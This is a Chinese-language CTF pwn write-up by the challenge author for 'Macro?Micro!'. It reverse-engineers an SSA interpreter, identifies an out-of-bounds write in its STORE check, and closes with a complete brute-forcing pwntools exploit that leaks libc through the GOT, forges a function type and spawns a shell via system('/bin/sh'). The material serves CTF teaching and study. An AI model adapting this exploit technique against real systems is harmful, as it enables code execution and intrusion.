# UniCTF - Macro?Micro!

这道题原版叫做 SSA-Revenge，是上一道 Micro?Macro! 的进阶版，实现了一个更完善的 SSA。改名后叫 Macro?Micro!，因为直接给了明文指令，而且指令层面几乎没有做混淆（反编译出来比较丑），但漏洞点隐藏得很深，是在 STORE 时的一个检查没有检查结尾，导致 OOB Write 漏洞，题目的描述也给了暗示。

## 分析

一样，`checksec` 一下，可以看到限制更严格，保护全开且去掉了符号表：

```bash
❯ checksec vuln
[*] '/home/neptune/unictf/Macro?Micro!/vuln'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
```

入口主逻辑很短，反编译里可以直接看到：

```c
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char v4; // [rsp+Fh] [rbp-11h] BYREF
  unsigned __int64 v5; // [rsp+10h] [rbp-10h]

  v5 = __readfsqword(0x28u);
  sub_2150(&v4, a2, a3);
  sub_2260(&v4);
  sub_22C0(&v4);
  return 0;
}
```

也就是初始化 -> 关闭缓冲 -> 主循环解析指令。

## 结构体还原

这题没有符号表，只能从反编译片段里的内存块大小、访问步长、字段偏移反推结构体。（很多地方其实和上一题相似

### 1) values

初始化时：

```c
sub_5A70(a1, ptr, 768);
```

`ptr` 被填充 768 字节，而随机槽位索引是 `% 0x40`，并且访问方式是 `ptr[3 * idx]`：

```c
ptr[3 * n0x40] = 1;
*(_QWORD *)&ptr[3 * n0x40 + 1] = ptr;
```

因此可以推导：

- 槽位数 0x40 = 64
- 每槽 768 / 64 = 12 字节
- 第 0 个 `int` 为 type，后面 8 字节为 data

得到结构：

```c
struct SSAValue {
  int type;        // ptr[3*i]
  uint64_t data;   // *(uint64_t*)&ptr[3*i+1]
}; // sizeof = 0xC
```

和上一题的区别就是 padding 被去掉了。

### 2) Instruction，指令表 dword_7660

指令入表时：

```c
memcpy(&dword_7660[27 * v27], &s_, 0xD8u);
```

说明一条指令大小固定为 `0xD8 = 216` 字节。
数组大小为 27648 字节：

```
27648 / 216 = 128
```

和 `n128 < 128` 的判断一致，所以这是128 条指令的数组。

在执行时，取指是：

```c
v27 = (const char *)&dword_7660[27 * v25];
*(_DWORD *)v27 // opcode
*(int *)(v27+4) // dest
*(int *)(v27+8) // src1
*(int *)(v27+12) // src2
*(int64_t *)(v27+16) // imm
```

再结合 label/phi/branch 的字符串读取：

```c
v27 + 24   // sarg1
v27 + 88   // sarg2
```

可还原为：

```c
struct Instruction {
  int op;           // +0x00
  int dest;         // +0x04
  int src1;         // +0x08
  int src2;         // +0x0C
  int64_t imm;      // +0x10
  char sarg1[64];   // +0x18
  char sarg2[64];   // +0x58
  char sarg3[64];   // +0x98
}; // 0xD8
```

### 3) LabelInfo（qword_E260）

标签表初始化：

```c
sub_5A70(a1, &qword_E260, 1088);
```

后续访问：

```c
if ( !strncmp((const char *)&qword_E260 + 68 * i, s2, 0x40u) )
  return *(_DWORD *)&qword_E260 + 17 * i + 16;
```

可推导：

- 每项大小 68 字节 = 64 字节名称 + 4 字节 pc
- 总项数 1088 / 68 = 16

```c
struct LabelInfo {
  char name[64];
  int pc;
};
```

### 4) BasicBlk（qword_E6A0）

块表初始化：

```c
sub_5A70(a1, &qword_E6A0, 28480);
```

执行时取块指针：

```c
v24 = (char *)qword_E6A0 + 1780 * i;
```

所以每块大小 1780 字节，数组大小 28480 字节：

```
28480 / 1780 = 16
```

后续对 `v24` 的字段访问可以定位出：

```c
*((_DWORD *)v24 + 16) // start_pc
*((_DWORD *)v24 + 17) // end_pc
*((_DWORD *)v24 + 18) // phi_count
v24 + 1196 // visible[64]
v24 + 1264 // preds/succs 字符串区域
```

结合 `sub_56C0` 中的清零与赋值：

```c
memset(s, 0, 0x6F4u); // 0x6F4 = 1780
strncpy((char *)s, src, 0x3Fu); // blk.name
s[16] = j; // start_pc
s[17] = -1; // end_pc
s[18] = 0; // phi_count
memset(s + 299, 0, 0x40u); // visible[64]
*((_BYTE *)s + n0x40 + 1196) = 1; // rand_slot 可见
s[315] = 0; // pred_count
s[380] = 0; // succ_count
```

因此可以还原大致布局：

```c
struct PhiEntry {
  int dest;
  int src1;
  int src2;
  char pred1[64];
  char pred2[64];
}; // 0x8C

struct BasicBlk {
  char name[64];
  int start_pc; // +64
  int end_pc; // +68
  int phi_count; // +72
  PhiEntry phis[8]; // +76, 每个 0x8C
  unsigned char visible[64]; // +1196
  int pred_count; // +1260 (结合 sub_5480)
  char preds[4][64]; // +1264
  int succ_count; // +1516 (结合 sub_3980)
  char succs[4][64]; // +1524
}; // 0x6F4
```

这部分结构对后续“可见性”和“phi 传值”限制非常关键：

- `visible` 决定指令能否使用某个槽位
- `preds/succs` 用于验证 PHI 前驱是否合法

## 初始化与随机槽位

初始化函数：

```c
__int64 __fastcall sub_2150(__int64 a1)
{
  n0x40 = 0;
  n128 = 0;
  i = 0;
  i_0 = 0;
  n0x40 = sub_59B0(a1);
  byte_7348 = 1;
  byte_7350 = 1;
  sub_5A70(a1, ptr, 768);
  sub_5A70(a1, &dword_7660, 27648);
  n128 = 0;
  sub_5A70(a1, &qword_E260, 1088);
  i = 0;
  sub_5A70(a1, &qword_E6A0, 28480);
  i_0 = 0;
  ptr[3 * n0x40] = 1;
  *(_QWORD *)&ptr[3 * n0x40 + 1] = ptr;
  return sub_5AD0(a1);
}
```

- `dword_7334 = sub_59B0(a1);` 从 `/dev/urandom` 拿随机数 `% 0x40`：

> 其实这里本来用的是 C++ 自带的 `srand` 函数，但是由于不是密码学安全的伪随机，测试时效果太烂了，有时候打了上万次都拿不到 shell，换成了 `/dev/urandom` 效果就好非常多。

```c
__int64 sub_59B0()
{
  ...
  return ptr % 0x40;
}
```

- `ptr` 是 SSA 值数组（每个值 12 字节），`ptr[3 * dword_7334] = 1` 表示 **该槽位 type=PTR**。
- `*(_QWORD *)&ptr[3 * dword_7334 + 1] = ptr;` 说明 **data 指向 values 基址**。

所以题目里存在一个随机槽位，是“指向 values 基址的指针”。但不会输出索引，需要爆破。

上一题通过 `dbg` 给出槽位，这一题只能靠爆破来命中。

## 交互解析与 SSA 规则

从主循环可以看到指令添加在 `sub_28F0`：

- 第一条必须是 `label entry`：

```c
    if ( !n128 )
    {
      memset(s, 0, sizeof(s));
      _isoc23_sscanf(::s, "%31s", s);
      if ( strcmp(s, "label") )
      {
        v2 = std::operator<<<std::char_traits<char>>(
               &std::cerr,
               "[!] First instruction must be a label (no implicit entry)");
        std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
        return __readfsqword(0x28u);
      }
      memset(s1, 0, sizeof(s1));
      _isoc23_sscanf(::s, "%*s %31s", s1);
      sub_34A0(a1, s1);
      if ( strcmp(s1, "entry") )
      {
        v3 = std::operator<<<std::char_traits<char>>(&std::cerr, "[!] First label must not be '");
        v4 = std::operator<<<std::char_traits<char>>(v3, s1);
        v5 = std::operator<<<std::char_traits<char>>(v4, "'");
        std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
        return __readfsqword(0x28u);
      }
    }
```

- 每条指令都写入 `dword_7660[27 * idx]`，总上限 128：

```c
if ( n128 < 128 ) { ... memcpy(&dword_7660[27 * v27], &s_, 0xD8u); }
```

## 基本块与 CFG 构建

执行 `run` 时会先构建 basic block：

```c
  sub_3590(a1);
  if ( !i_0 )
  {
    v2 = std::operator<<<std::char_traits<char>>(&std::cout, "[!] No blks to execute");
    return std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
  }
  sub_3980(a1); // CFG
  sub_3F00(a1); // PHI 验证
```

`sub_3590` 里可以看到：

- `label` 触发新块创建
- `phi` 必须出现在 label 后
- 每个块必须以 terminator 结尾（br / brcond / ret / exit），否则直接退出

关键检查：

```c
  if ( n128 > 0 && LODWORD(dword_7660[0]) != 7 )
  {
    v1 = std::operator<<<std::char_traits<char>>(
           &std::cerr,
           "[!] First instruction must be a label (no implicit entry)");
    std::ostream::operator<<(v1, &std::endl<char,std::char_traits<char>>);
    exit(1);
  }
```

以及：

```c
    if ( *((_DWORD *)v9 + 16) <= *((_DWORD *)v9 + 17)
      && *((int *)v9 + 17) >= 0
      && !sub_5980(a1, dword_7660[27 * *((int *)v9 + 17)]) )
    {
      v5 = std::operator<<<std::char_traits<char>>(&std::cerr, "[!] Basic blk '");
      v6 = std::operator<<<std::char_traits<char>>(v5, v9);
      v7 = std::operator<<<std::char_traits<char>>(v6, "' does not end with a terminator");
      std::ostream::operator<<(v7, &std::endl<char,std::char_traits<char>>);
      exit(1);
    }
```

因此要保证 entry 块和目标块都必须有终止指令。

## SSA 可见性与 PHI

`sub_4150` 处理 PHI：

```c
    if ( ptr[3 * n0x40] )
    {
      v13 = std::operator<<<std::char_traits<char>>(&std::cerr, "[!] Only int values are allowed in PHI sources");
      std::ostream::operator<<(v13, &std::endl<char,std::char_traits<char>>);
      abort();
    }
    sub_5080(a1, *(_DWORD *)v17, (__int64)"phi");
    memset(&ptr[3 * *(int *)v17], 0, 0xCu);
    ptr[3 * *(int *)v17] = 0;
    *(_QWORD *)&ptr[3 * *(int *)v17 + 1] = *(_QWORD *)&ptr[3 * n0x40 + 1];
    sub_5180(a1, a2, *(unsigned int *)v17);
```

说明 PHI 只允许 TYPE_INT，且 PHI 会把数据拷贝到新的槽位。
这就是必须使用 PHI 来跨块传值的原因。

## 指令语义（从反编译看出来的约束）

核心执行在 `sub_4550`，里面直接 switch：

- `case 0`：const
- `case 1`：add
- `case 2`：load
- `case 3`：store
- `case 4`：call

### ADD

```c
        if ( ptr[3 * *(int *)(a3 + 8)] || ptr[3 * *(int *)(a3 + 12)] )
        {
          if ( ptr[3 * *(int *)(a3 + 8)] == 1 && !ptr[3 * *(int *)(a3 + 12)] )
          {
            ptr[3 * *(int *)(a3 + 4)] = 1;
            *(_QWORD *)&ptr[3 * *(int *)(a3 + 4) + 1] = *(_QWORD *)&ptr[3 * *(int *)(a3 + 12) + 1]
                                                      + *(_QWORD *)&ptr[3 * *(int *)(a3 + 8) + 1];
          }
        }
        else
        {
          ptr[3 * *(int *)(a3 + 4)] = 0;
          *(_QWORD *)&ptr[3 * *(int *)(a3 + 4) + 1] = *(_QWORD *)&ptr[3 * *(int *)(a3 + 12) + 1]
                                                    + *(_QWORD *)&ptr[3 * *(int *)(a3 + 8) + 1];
        }
```

可以得到：

- `INT + INT -> INT`
- `PTR + INT -> PTR`

允许从随机槽位指针做偏移运算，构造任意地址，这和上一题是相同的。

### LOAD

```c
        v24 = *(_QWORD **)&ptr[3 * *(int *)(a3 + 8) + 1];
        if ( v24 )
        {
          v38[0] = a1;
          if ( (sub_51B0(v38, (__int64)v24) & 1) == 0 )
          {
            v5 = std::operator<<<std::char_traits<char>>(&std::cerr, "[!] LOAD err2");
            std::ostream::operator<<(v5, &std::endl<char,std::char_traits<char>>);
            abort();
          }
          sub_5080(a1, *(_DWORD *)(a3 + 4), "load");
          ptr[3 * *(int *)(a3 + 4)] = 0;
          *(_QWORD *)&ptr[3 * *(int *)(a3 + 4) + 1] = *v24;
          sub_5180(a1, a2, *(unsigned int *)(a3 + 4));
        }
```

`sub_51B0` 最终走到 `sub_53A0 -> sub_5400`，只允许读可执行区间：

```c
bool __fastcall sub_5400(
        __int64 a1,
        unsigned __int64 p___libc_start_main_1,
        __int64 n8,
        unsigned __int64 p___libc_start_main_2,
        unsigned __int64 p___libc_start_main)
{
  if ( n8 )
    return p___libc_start_main_1 >= p___libc_start_main_2
        && p___libc_start_main_1 < p___libc_start_main
        && !__CFADD__(n8, p___libc_start_main_1)
        && n8 + p___libc_start_main_1 <= p___libc_start_main;
  else
    return 0;
}
```

发现做了一些限制，可以读 GOT 表，但是不能直接读 libc 区间。不过这不影响 exp 的构造。

### STORE

关键检查串起来是：

```c
if ( !sub_51E0(...) ) "[!] STORE err2";
if ( (sub_5220(&v34, v25) & 1) == 0 ) "[!] STORE err3"; // 4-byte 对齐
if ( sub_5240(&v33, (v25 - ptr) % 0xCuLL) ) "[!] STORE err4"; // offset==0 禁止
if ( (sub_5260(&v32, v25, v25 + 8) & 1) != 0 ) "[!] STORE err5";
*(_QWORD *)v25 = data[src];
```

其中 `sub_5240` 只检查 `offset == 0`：

```c
bool __fastcall sub_5240(__int64 a1, __int64 a2)
{
	return a2 == 0;
}
```

也就是说只禁止从槽头写，但不检查写入长度跨槽，这就是利用的漏洞点所在。

### CALL

调用前两层检查：

```c
if ( (sub_52C0(&v31, v26) & 1) != 0 ) "[!] CALL err3";
...
if ( v27 ) {
	if ( (sub_52F0(&v30, v27) & 1) != 0 ) "[!] CALL err4";
}
```

`sub_52C0` / `sub_52F0` 都会走到 `sub_53A0` 的区间限制，可以发现：
- 函数指针不能指向主程序段
-*参数也不能指向主程序段或 values 区

因此最终目标必须是 libc 里的函数，参数也必须在 libc，所以像上一题的第二个解一样直接把 `/bin/sh` 写入槽内是不可行的。

## 跨槽覆盖 type 字段

values 是 12 字节 packed：

```
[type:4][data:8]
```

STORE 写 8 字节，只检查 offset!=0。
当写入起点位于 `offset=8` 时：

```
写入范围: [slot+8, slot+15]
覆盖内容: 当前槽 data[高 4字节] + 下一个槽 type(4字节)
```

因此可以用 8 字节构造：

```
0x0000000200000000
```

即 `2 << 32`。

高 4 字节把下一槽 type 改成 TYPE_FUNC。

## 利用流程

### 1) 猜测随机槽位

`sub_59B0()` 返回 `rand % 0x40`，没有任何输出，
所以只能多次运行尝试，这个看运气了，出题人最多也就爆破了几百次，没有超过一千次的。

一旦命中，该槽位的值是：

```
type=1 (PTR)
data=&values[0]
```

### 2) 读取 GOT 泄漏 libc

LOAD 只能读可执行区，所以只能读 GOT：

```
values[rand_slot] + (printf@got - values_base)
```

得到 `printf` 实际地址后：

```
system = printf + (system - printf)
binsh  = printf + ("/bin/sh" - printf)
```

### 3) SSA 传值到新块

如果直接在同一块做 `call`，会遇到 SSA “定义一次”与可见性限制。
必须 `br` 到新块，然后通过 `phi` 把 `system` 和 `/bin/sh` 传进来，`phi` 是可以从同一个块复杂值进来的：

```
phi r_sys [sys, entry] [sys, entry]
phi r_sh  [sh,  entry] [sh,  entry]
```

### 4) 覆盖 type 为 TYPE_FUNC 并调用

找一个安全的 `k`，构造 `values[k] + 8`，写入 `0x0000000200000000`：

```
values[k+1].type = TYPE_FUNC
values[k+1].data = system_addr
```

最后执行：

```
call values[k+1], binsh
```

## 指令序列示意

```
label entry
const  r_off_got,   offset_printf_got
add    r_ptr_got,   rand_slot, r_off_got
load   r_printf,    r_ptr_got
const  r_off_sys,   offset_system
add    r_system,    r_printf, r_off_sys
const  r_off_binsh, offset_binsh
add    r_binsh,     r_printf, r_off_binsh
br haxx

label haxx
phi    r_sys2 [r_system, entry] [r_system, entry]
phi    r_sh2  [r_binsh,  entry] [r_binsh,  entry]
const  r_off_type,  k*12 + 8
add    r_type_ptr,  rand_slot, r_off_type
const  r_type_val,  0x0000000200000000
store  r_type_ptr,  r_type_val
call   r_sys2, r_sh2
ret
```

## exp

```python
#!/usr/bin/env python3
from pwn import *

context(log_level="debug", arch="amd64")

libc = ELF("./libc.so.6")

offset_printf_got = 0x6290 - 0x7360  # printf@GOT - &values[0]
offset_system = libc.symbols["system"] - libc.symbols["printf"]
offset_binsh = next(libc.search(b"/bin/sh\x00")) - libc.symbols["printf"]


def cmd(io, c: str):
    io.sendlineafter(b"> ", c.encode())


attempt = 0
while True:
    attempt += 1
    log.info(f"尝试第 {attempt} 次...")

    try:
        io = process("./vuln_patched")
        # io = remote("localhost", 9999)
        context.log_level = "info"

        # 首块必须为 entry 块
        cmd(io, "label entry")
        # 泄漏 printf@libc 地址
        cmd(io, f"const 1 {offset_printf_got}")  # values[1] = offset to printf@GOT
        cmd(
            io, "add 2 42 1"
        )  # values[2] = &printf@GOT tips： 42 是猜测的 rand_slot，需要爆破到正确为止
        cmd(io, "load 3 2")  # values[3] = printf@libc
        # 计算 system@libc 和 "/bin/sh"@libc 地址
        cmd(io, f"const 4 {offset_system}")  # values[4] = offset_system
        cmd(io, "add 5 3 4")  # values[5] = system@libc
        cmd(io, f"const 6 {offset_binsh}")  # values[6] = offset_binsh
        cmd(io, "add 7 3 6")  # values[7] = "/bin/sh"@libc
        # 跳转到调用块
        cmd(io, "br haxx")

        # haxx 块，调用 system("/bin/sh")
        cmd(io, "label haxx")
        cmd(io, "phi 8 [5, entry] [5, entry]")  # values[8] = system@libc
        cmd(io, "phi 9 [7, entry] [7, entry]")  # values[9] = "/bin/sh"@libc
        # 跨槽位写入，修改 values[8].type = TYPE_FUNC
        # sizeof(SSAValue) = 12 (packed)
        # values[7]: offset 84-95
        # values[8]: offset 96-107
        #   [96-99]: type
        #   [100-107]: data (system@libc)
        # 7*12+8=92，从 offset 92 写入 8 字节，覆盖 values[7].data[4:8] 和 values[8].type
        cmd(io, "const 10 92")  # values[10] = offset(values[8].type) = 7*12+8
        cmd(io, "add 11 42 10")  # values[11] = &values[8].type
        cmd(io, f"const 12 {2 << 32}")  # values[12] = 2 << 32 = 0x0000000200000000
        cmd(io, "store 11 12")  # values[8].type = TYPE_FUNC
        cmd(io, "call 8 9")  # 调用 values[8](values[9]) → system("/bin/sh")
        cmd(io, "ret")

        # 执行 SSA 程序
        cmd(io, "run")

        # 等待程序执行完成
        io.recvuntil(b"[*] Executing program...\n", timeout=2)

        # 测试是否成功获取 shell
        io.sendline(b"id")
        result = io.recvline(timeout=2)

        if b"uid=" in result:
            log.success(f"成功！在第 {attempt} 次尝试后获得 shell")
            context(log_level="debug")
            io.interactive()
            break
        else:
            log.info(f"第 {attempt} 次失败，没有获得 shell，重试...")
            io.close()

    except EOFError:
        io.close()
```
